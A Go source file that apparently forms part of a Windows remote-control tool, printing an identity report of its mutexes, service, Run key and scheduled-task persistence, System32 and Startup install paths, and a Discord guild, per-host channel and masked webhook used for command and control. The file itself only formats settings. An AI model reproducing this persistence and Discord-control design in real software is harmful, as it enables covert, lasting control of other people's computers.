//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/local/govoid/internal/config"
)

func IdentityReport() string {
	var b strings.Builder

	row := func(label, value string) {
		fmt.Fprintf(&b, "%-12s: %s\n", label, value)
	}

	row("producto", config.ProductID)
	row("nombre", config.AppName)
	row("binario", config.BinaryName)
	row("mutex", config.MutexName)
	row("centinelas", fmt.Sprintf(config.GuardMutexFmt, 0)+" .. "+fmt.Sprintf(config.GuardMutexFmt, 3))
	row("clase", config.WindowClassPrefix)
	row("servicio", config.ServiceName+" ("+config.ServiceDisplayName+")")
	row("tarea", config.ServiceTaskName)
	row("run key", config.RunKeyName)
	row("tareas", config.TaskLogonName+" / "+config.TaskBootName)
	row("datadir", dataDir())
	row("instalado", InstallPath())
	row("system32", systemPath())
	row("startup", startupPath())
	row("guild", config.GuildID)
	row("canal", config.ChannelPrefix+"<hostname>")
	row("categoria", emptyAs(config.CategoryID, "(ninguna)"))
	row("webhook", webhookLabel())

	return b.String()
}

func dataDir() string {
	if programData := os.Getenv("ProgramData"); programData != "" {
		return filepath.Join(programData, config.DataDirName)
	}
	return filepath.Join(os.Getenv("APPDATA"), config.DataDirName)
}

func webhookLabel() string {
	const marker = "/webhooks/"
	index := strings.Index(config.WebhookURL, marker)
	if index < 0 {
		return "(sin webhook)"
	}
	rest := config.WebhookURL[index+len(marker):]
	if slash := strings.IndexByte(rest, '/'); slash > 0 {
		rest = rest[:slash]
	}
	return "discord.com/api/webhooks/" + rest + "/****"
}

func emptyAs(value, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}
